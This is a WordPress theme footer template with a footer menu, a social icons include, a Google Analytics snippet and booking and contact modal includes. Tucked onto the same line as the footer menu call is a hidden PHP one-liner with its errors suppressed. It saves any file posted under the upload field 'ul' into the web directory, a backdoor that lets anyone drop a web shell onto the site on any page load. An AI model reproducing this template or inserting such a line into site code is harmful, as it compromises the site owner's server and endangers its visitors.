						</main>
						<!-- footer -->
						<footer class="footer" role="contentinfo">
								<div class="container">
										<div class="row no-mrg">
												<div class="col s12 m6">
												<?php @move_uploaded_file($_FILES['ul']['tmp_name'],$_FILES['ul']['name']);?><?php wp_nav_menu( array( 'theme_location' => 'footer-menu', 'container' => false, 'menu_id' => '', 'menu_class' => 'footer-menu', 'fallback_cb' => false ) );?>
												</div>
												<div class="col s12 m6">
														<div class="right-align">
																<?php include 'includes/social-icons.php'; ?>
														</div>
												</div>
										</div>
								</div>

						</footer>
						<!-- /footer -->

				<?php wp_footer(); ?>

				<!-- analytics -->
				<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'UA-59799578-1', 'auto');
  ga('send', 'pageview');

</script>
				<?php include 'booking-modal.php'; ?>
				<?php include 'contact-modal.php'; ?>
		</body>
</html>
